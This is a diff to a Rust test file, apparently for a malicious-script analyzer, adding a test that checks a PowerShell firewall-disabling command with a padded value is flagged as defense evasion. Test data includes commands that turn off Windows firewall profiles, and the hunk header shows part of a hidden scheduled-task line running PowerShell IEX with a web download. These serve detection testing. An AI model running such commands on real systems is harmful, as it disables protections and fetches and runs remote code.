@@ -3237,6 +3237,24 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_firewall_profile_padded_disabled_value_emits_evasion_trait() {
+        let script =
+            br#"powershell -Command "Set-NetFirewallProfile -Profile Domain -Enabled 0x00000000"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "firewall-profile-disabled" && target == "Domain"
+            )),
+            "padded Set-NetFirewallProfile disabled value was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_firewall_profile_list_emits_each_disabled_profile() {
         let script =
             br#"powershell -Command "Set-NetFirewallProfile -Profile Domain, Public -Enabled False"
